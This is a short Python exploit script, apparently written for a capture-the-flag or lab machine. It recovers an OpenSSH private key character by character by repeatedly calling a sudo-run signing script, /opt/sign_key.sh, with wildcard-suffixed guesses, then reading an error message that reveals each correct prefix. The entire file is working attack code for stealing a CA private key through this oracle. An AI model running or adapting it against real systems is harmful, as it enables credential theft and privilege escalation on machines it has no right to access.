#!/usr/bin/python3
import subprocess
import sys

chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789+/=- "
key = "-----BEGIN OPENSSH PRIVATE KEY-----"
ctr = 0

while True:
    if ctr == 0:
        key += "\n"
        print(key)
    if "-----END OPENSSH PRIVATE KEY-----" in key:
        break
    for char in chars:
        f = open("/tmp/temp.txt", "w")
        f.write(key+char+"*")
        f.close()
        command = ["sudo", "/opt/sign_key.sh", "/tmp/temp.txt", "/home/zzinter/.ssh/id_rsa.pub", "support", "support", "1"]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Error: Use API for signing with this CA." in result.stdout:
            key += char
            ctr = (ctr + 1) % 70
            break
        elif char == chars[-1]:
            ctr = 0

print(key)
